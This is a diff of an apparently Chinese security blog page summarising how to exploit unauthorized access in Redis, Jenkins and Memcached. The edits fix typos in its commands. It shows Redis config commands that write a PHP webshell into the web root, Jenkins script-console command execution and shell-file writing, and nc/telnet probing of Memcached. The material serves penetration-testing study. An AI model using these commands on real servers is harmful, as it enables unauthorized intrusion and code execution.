@@ -17,7 +17,7 @@
 <meta property="og:site_name" content="thinks 专注学习">
 <meta property="og:description" content="简单总结下常见组件未授权访问漏洞利用方式">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-29T03:01:11.673Z">
+<meta property="og:updated_time" content="2019-10-28T08:14:17.802Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="常见组件未授权访问漏洞利用">
 <meta name="twitter:description" content="简单总结下常见组件未授权访问漏洞利用方式">
@@ -148,7 +148,7 @@
 <p>&#x611F;&#x8C22;&#x5927;&#x4F6C;&#x7684;&#x603B;&#x7ED3; <a href="https://xz.aliyun.com/t/6103" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103</a></p>
 <h2 id="Redis-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Redis-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Redis &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Redis &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>1. &#x5199;webshell
 config set dir /var/www/html
-config set fbfilename test.php
+config set dbfilename test.php
 config set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;
 save
 2. &#x5199;crontab&#x53CD;&#x5F39;shell
@@ -163,7 +163,7 @@ https://paper.seebug.org/975/</code></pre><h2 id="MongoDB-&#x672A;&#x6388;&#x674
 &#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;https://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe</code></pre><h2 id="Jenkins-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Jenkins-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Jenkins &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Jenkins &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>http://www.secpulse.com:8080/manage
 http://www.secpulse.com:8080/script
 &#x70B9;&#x51FB; &quot;&#x811A;&#x672C;&#x547D;&#x4EE4;&#x6267;&#x884C;&quot; 
-&#x53EF;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4; println &quot;whoami&quot;.execute().tex
+&#x53EF;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4; println &quot;whoami&quot;.execute().text
 &#x5199;&#x6587;&#x4EF6; new File (&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php phpinfo(); ?&gt;&apos;)</code></pre><h2 id="Memcached-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Memcached-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Memcached &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Memcached &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>Memcached&#x662F;&#x4E00;&#x5957;&#x5E38;&#x7528;&#x7684;key-value&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;&#xFF0C;&#x7531;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x63A7;&#x5236;&#x6A21;&#x5757;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x516C;&#x7F51;&#x5F00;&#x653E;&#x7684;Memcache&#x670D;&#x52A1;&#x5F88;&#x5BB9;&#x6613;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x626B;&#x63CF;&#x53D1;&#x73B0;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x4EA4;&#x4E92;&#x53EF;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;Memcached&#x4E2D;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x3002;
 &#x6D4B;&#x8BD5;&#x6F0F;&#x6D1E;&#xFF1A;
 telnet 10.0.4.138 11211 &#x6216; nc -vv &lt;target&gt; 11211
